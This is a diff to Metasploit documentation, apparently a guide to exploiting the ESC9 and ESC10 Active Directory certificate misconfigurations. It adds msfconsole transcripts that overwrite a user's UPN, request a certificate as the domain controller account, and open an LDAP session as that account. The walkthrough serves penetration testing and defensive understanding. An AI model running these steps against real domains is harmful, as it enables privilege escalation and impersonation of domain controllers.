@@ -925,7 +925,7 @@ msf6 auxiliary(server/relay/esc8) >
 
 ESC9 and ESC10 are similar certificate misconfiguration abuse techniques. They both involve having credentials of a
 user, say "user1", who has GenericWrite privileges over "user2". This allows an attacker as "user1" to update either the
-`userPrincipalName` or `dNSHostName` attribute of "user2". In order to update the attribute, we need to authenticated 
+`userPrincipalName` or `dNSHostName` attribute of "user2". In order to update the attribute, we need to authenticate 
 via LDAP - which is a unique requirement compared to the  other ESC techniques and is why we have created a separated
 module called `esc_update_ldap_object`
 
@@ -986,7 +986,6 @@ Both can be used to exploit the certificate misconfiguration. It should be noted
 attribute, only machine accounts do.
 
 # Exploiting ESC9
-
 ## ESC9 Scenario 1
 Pre-requisites:
 - `StrongCertificateBindingEnforcement` is set to `1` (if it's set to `0` exploitation will still work but technically you're exploiting ESC10 in that case)
@@ -1029,7 +1028,7 @@ The option `UPDATE_LDAP_OBJECT` is an enum that can be set to either `userPrinci
 set in order to instruct the module to attempt to exploit ESC9 or ESC10. We will set `UPDATE_LDAP_OBJECT` to
 `userPrincipalName` in this case and so we then must set `ALT_UPN` to `Administrator@kerberos.issue` and `NEW_VALUE` to `Administrator`. 
 
-`NEW_VALUE` will be the updated value of either the `userPrincipalName` or `dNSHostName` attribute. It's important when
+`NEW_VALUE` will be the updated value of either the `userPrincipalName` or `dNSHostName` attribute. It's important for this scenario, when
 updating the UPN to omit the domain suffix from the UPN to avoid conflicts with other UPNs in the domain, which by default all contain the suffix. 
 The UPN processing order will still allow the DC to map the UPN Administrator in our writable account to the actual administrator, making its impersonation possible.
 
@@ -1109,7 +1108,7 @@ Pre-requisites:
 - A vulnerable certificate template has the `CT_FLAG_NO_SECURITY_EXTENSION` flag set.
 - The same vulnerable template has the `SubjectAltRequireDNS` flag set. <--- (Difference 1/2 between pre-requisites in scenario 1 and 2)
 - The same vulnerable template has a client authentication EKU
-- We have credentials of a machine account who has `GenericWrite` privileges over another machine account that can enroll in the vulnerable template <--- (Difference 2/2 between pre-requisites in scenario 1 and 2)
+- We have credentials of a machine account who has `GenericWrite` privileges over another **machine account** that can enroll in the vulnerable template <--- (Difference 2/2 between pre-requisites in scenario 1 and 2)
   - Only machine accounts can have the `dNSHostName` attribute set, so our "target_user" needs to be machine account and we can't 
 
 The option `UPDATE_LDAP_OBJECT` will now be set to `dNSHostName` and because only machine accounts have the `dNSHostName` attribute we will set our `TARGET_USER` to the machine account`Test1$` 
@@ -1134,6 +1133,12 @@ msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT dns
 UPDATE_LDAP_OBJECT => dNSHostName
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
 CA => kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_udpate_ldap_object) > set smbuser "Test1$"
+smbuser => Test1$
+msf6 auxiliary(admin/dcerpc/esc_udpate_ldap_object) > set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_udpate_ldap_object) > set smbdomain kerberos.issue
+smbdomain => kerberos.issue
 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
 [*] Running module against 172.16.199.200
 [+] 172.16.199.200:445 - Retrieved original value for dnshostname: dc2.kerberos.issue
@@ -1172,43 +1177,69 @@ msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.16.199.200 cert_
 [*] Auxiliary module execution completed
 ```
 
-# ESC10 
+# Exploiting ESC10
+## ESC10 Scenario 1
 Pre-requisites:
 - `StrongCertificateBindingEnforcement` is set to `0`
-- The same vulnerable template has the `SubjectAltRequireUPN` flag set.
+- Because the above is set to `0` we don't need the `CT_FLAG_NO_SECURITY_EXTENSION` flag set on the vulnerable template
+- Other than the above, pre-requisites and exploitation are the exact same as ESC9 Scenario 1
+
+## ESC10 Scenario 2
+Pre-requisites: 
+- `CertificateMappingMethods` is set to `0x0004` (UPN certificate mapping) or `0x001F` (All of the above values)
+- The vulnerable template has the `SubjectAltRequireUPN` or `SubjectAltRequireDNS` (We can exploit either in this scenario)
 - The same vulnerable template has a client authentication EKU
-- We have credentials of a user who has `GenericWrite` privileges over another user that can enroll in the vulnerable template
+- We have credentials of a machine account who has `GenericWrite` privileges over another machine account that can enroll in the vulnerable template
+
+In this scenario we can only compromise accounts that do not already have a populated `userPrincipalName` attribute, such as machine accounts and the default domain administrator.
+In addition, because this registry key only applies to SChannel authentication we are forced to authenticate to LDAPS once we get a certificate.
+If the certificate doesn't work when attempting to authenticate to LDAPS try setting `StrongCertificateBindingEnforcement` to `2` to ensure you're 
+exploiting scenario 2 and getting a `.pfx` file made for SChannel authentication.
 
 ```
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set rhosts 172.16.199.200
+rhosts => 172.16.199.200
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set ldaprport 389
+ldaprport => 389
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set target_username "user2"
+target_username => user2
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set new_value 'DC2$@kerberos.issue'
+new_value => DC2$@kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set alt_upn 'DC2$@kerberos.issue'
+alt_upn => DC2$@kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set UPDATE_LDAP_OBJECT userPrincipalName
+UPDATE_LDAP_OBJECT => userPrincipalName
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CA kerberos-DC2-CA
+CA => kerberos-DC2-CA
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set CERT_TEMPLATE ESC10-Template
+CERT_TEMPLATE => ESC10-Template
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbdomain kerberos.issue
+smbdomain => kerberos.issue
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > set smbuser user1
+smbuser => user1
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > run
 [*] Running module against 172.16.199.200
-[*] 172.16.199.200:445 - Connecting to ICertPassage (ICPR) Remote Protocol
-[*] 172.16.199.200:445 - Binding to \cert...
-[+] 172.16.199.200:445 - Bound to \cert
-[+] 172.16.199.200:445 - Successfully bound to the LDAP server!
-[*] 172.16.199.200:445 - Using base DN: DC=kerberos,DC=issue
-[*] 172.16.199.200:445 - Filter: (&(objectClass=user)(sAMAccountName=user2))
-[*] 172.16.199.200:445 - Attributes: ["userprincipalname"]
 [+] 172.16.199.200:445 - Retrieved original value for userprincipalname: user2
 [*] 172.16.199.200:445 - Original userPrincipalName of user2: user2
-[*] 172.16.199.200:445 - Updating userPrincipalName of user2 to Administrator
+[*] 172.16.199.200:445 - Updating userPrincipalName of user2 to DC2$@kerberos.issue
 [*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_update_object
 [*] 172.16.199.200:445 - Running auxiliary/gather/ldap_update_object
 [*] Connecting to LDAP on 172.16.199.200:389...
 [*] Searching for target object: user2...
 [+] Found target object DN: CN=user2,CN=Users,DC=kerberos,DC=issue
-[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...
-[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to Administrator
-[*] 172.16.199.200:445 - Requesting a certificate for user user2 - alternate UPN: Administrator@kerberos.issue - digest algorithm: SHA256 - template: ESC10-Template
+[*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to DC2$@kerberos.issue...
+[+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to DC2$@kerberos.issue
 [+] 172.16.199.200:445 - The requested certificate was issued.
 [*] 172.16.199.200:445 - Certificate Policies:
 [*] 172.16.199.200:445 -   * 2.5.29.37.0
 [*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
 [*] 172.16.199.200:445 -   * 1.3.6.1.5.5.7.3.1 (Server Authentication)
 [*] 172.16.199.200:445 -   * 1.3.6.1.4.1.311.20.2.2 (Smart Card Logon)
-[*] 172.16.199.200:445 - Certificate UPN: Administrator@kerberos.issue
-[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250515161130_default_172.16.199.200_windows.ad.cs_872391.pfx
-[*] 172.16.199.200:445 - Reverting userPrincipalName of user2 back to
+[*] 172.16.199.200:445 - Certificate UPN: DC2$@kerberos.issue
+[*] 172.16.199.200:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250527083347_default_172.16.199.200_windows.ad.cs_568048.pfx
+[*] 172.16.199.200:445 - Reverting userPrincipalName of user2 back to user2
 [*] 172.16.199.200:445 - Loading auxiliary/gather/ldap_update_object
 [*] 172.16.199.200:445 - Running auxiliary/gather/ldap_update_object
 [*] Connecting to LDAP on 172.16.199.200:389...
@@ -1217,6 +1248,29 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to user2...
 [+] Successfully updated CN=user2,CN=Users,DC=kerberos,DC=issue's userPrincipalName to user2
 [*] Auxiliary module execution completed
+
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use ldap_login
+[*] Using auxiliary/scanner/ldap/ldap_login
+[*] The CreateSession option within this module can open an interactive session
+msf6 auxiliary(scanner/ldap/ldap_login) > set rhost 172.16.199.200
+rhost => 172.16.199.200
+msf6 auxiliary(scanner/ldap/ldap_login) > set LDAP::Auth schannel
+LDAP::Auth => schannel
+msf6 auxiliary(scanner/ldap/ldap_login) > set LDAP::CertFile /Users/jheysel/.msf4/loot/20250527091750_default_172.16.199.200_windows.ad.cs_314482.pfx
+LDAP::CertFile => /Users/jheysel/.msf4/loot/20250527091750_default_172.16.199.200_windows.ad.cs_314482.pfx
+
+msf6 auxiliary(scanner/ldap/ldap_login) > run
+[+] Success: 'Cert File /Users/jheysel/.msf4/loot/20250527091750_default_172.16.199.200_windows.ad.cs_314482.pfx'
+[*] LDAP session 1 opened (172.16.199.1:57718 -> 172.16.199.200:389) at 2025-05-27 09:18:14 -0700
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Bruteforce completed, 1 credential was successful.
+[*] 1 LDAP session was opened successfully.
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ldap/ldap_login) > sessions -i -1
+[*] Starting interaction with 1...
+
+LDAP (172.16.199.200) > getuid
+[*] Server username: KERBEROS\DC2$
 ```
 
 
